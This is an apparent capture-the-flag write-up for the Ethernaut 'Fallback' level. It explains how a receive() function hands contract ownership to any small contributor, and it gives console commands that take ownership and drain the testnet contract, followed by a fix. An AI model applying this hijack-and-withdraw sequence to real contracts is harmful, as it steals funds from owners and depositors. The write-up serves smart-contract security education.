# Ethernaut Level 01 -- Fallback

**Game:** Ethernaut by OpenZeppelin
**Level:** 01 -- Fallback
**Category:** Access Control / Ownership Hijack
**Network:** Sepolia Testnet
**Status:** Completed

---

## Objective

1. Claim ownership of the contract
2. Reduce its balance to 0

---

## The Contract

The Fallback contract has two ways ownership can change:

The first is through the contribute() function. If your total contributions exceed the owner's contributions (1000 ETH), you become the owner. This is the intended path but practically impossible -- no one is going to contribute over 1000 ETH on a testnet or in a real attack scenario designed this way.

The second is through the receive() function. This is the fallback -- it runs automatically when ETH is sent directly to the contract with no function call attached. It sets the caller as the new owner if two conditions are met: the sent value is greater than 0, and the caller has at least one prior contribution on record.

---

## The Vulnerability

The receive() function is the backdoor:

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }

This function transfers ownership to anyone who sends ETH directly to the contract, as long as they have made at least one contribution. The contribution requirement is trivially satisfied -- the minimum contribution is just under 0.001 ETH, and there is no lower bound beyond that.

The vulnerability is that the receive() function performs a critical state change (ownership transfer) based on conditions that are easy for any attacker to satisfy. The logic that governs ownership transfer is inconsistent -- contribute() requires beating 1000 ETH in contributions, but receive() only requires a dust contribution and a direct ETH transfer.

---

## Attack Steps

Step 1 -- Make a small contribution to register contributions[player] > 0:

    await contract.contribute({value: toWei("0.0001")})

Step 2 -- Send ETH directly to the contract to trigger receive() and claim ownership:

    await sendTransaction({from: player, to: contract.address, value: toWei("0.0001")})

Step 3 -- Verify ownership transferred:

    await contract.owner()
    // returns player address

Step 4 -- Call withdraw() as the new owner to drain the contract:

    await contract.withdraw()

Step 5 -- Verify balance is zero:

    await getBalance(contract.address)
    // returns "0"

---

## The Fix

The receive() function should not perform ownership transfers. If the contract needs to accept ETH, the receive() function should only update the contributions mapping and leave ownership logic to a single, consistent code path:

    receive() external payable {
        require(msg.value > 0);
        contributions[msg.sender] += msg.value;
    }

Ownership transfer should only happen through contribute() with the full 1000 ETH threshold enforced, or better yet, through an explicit admin function protected by a multi-sig or timelock.

More broadly, any function that changes ownership or performs privileged state changes should be held to the same security standard. Having two code paths to ownership -- one hard and one trivially easy -- is a logic error that creates an exploitable inconsistency.

---

## Key Takeaway

Fallback and receive functions are often overlooked during code review because they are implicit -- they do not need to be called by name. Any contract that accepts ETH should have its receive() and fallback() functions reviewed with the same scrutiny as every other function. A receive() function that performs state changes beyond simple ETH accounting is a red flag.

---

## References

- Ethernaut Level 01 -- https://ethernaut.openzeppelin.com/level/1
- Solidity Documentation -- Fallback and Receive Functions
- SWC-105 -- Unprotected Ether Withdrawal
